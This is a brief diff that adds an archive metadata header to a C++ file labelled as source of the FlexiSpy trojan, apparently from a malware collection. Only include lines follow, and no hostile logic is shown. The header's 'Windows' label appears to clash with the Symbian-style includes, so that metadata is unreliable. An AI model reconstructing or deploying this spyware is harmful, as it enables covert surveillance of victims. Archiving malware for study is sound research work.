@@ -1,3 +1,14 @@
+/*
+  name      FlexiSpy
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 #include "CltMainContainer.h"
 #include <AknsDrawUtils.h>// skin
 #include <AknsBasicBackgroundControlContext.h> //skin 
